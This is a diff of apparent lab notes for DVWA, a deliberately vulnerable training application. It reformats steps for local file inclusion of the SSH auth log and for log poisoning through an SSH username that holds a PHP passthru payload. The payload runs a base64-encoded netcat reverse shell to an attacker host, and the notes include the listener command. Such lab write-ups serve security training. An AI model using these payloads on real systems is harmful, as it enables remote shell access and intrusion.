@@ -14,6 +14,8 @@
 1. SSH login attempts are in this file
    - ```[DVWA address]/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log```  
 2. Encode ```nc -e /bin/sh [Attacker address] 8888``` to Base64
-3. Attacker machine: ```nc -vv -l -p 8888```
-4. Attacker machine: ```ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxNzIuMjUuMTIuMzQgODg4OA=='));?>"@[DVWA address]```
-  
+3. Listening on attacker machine 
+   - ```nc -vv -l -p 8888```
+4. Attacker machine
+   - ```ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxNzIuMjUuMTIuMzQgODg4OA=='));?>"@[DVWA address]```
+ 
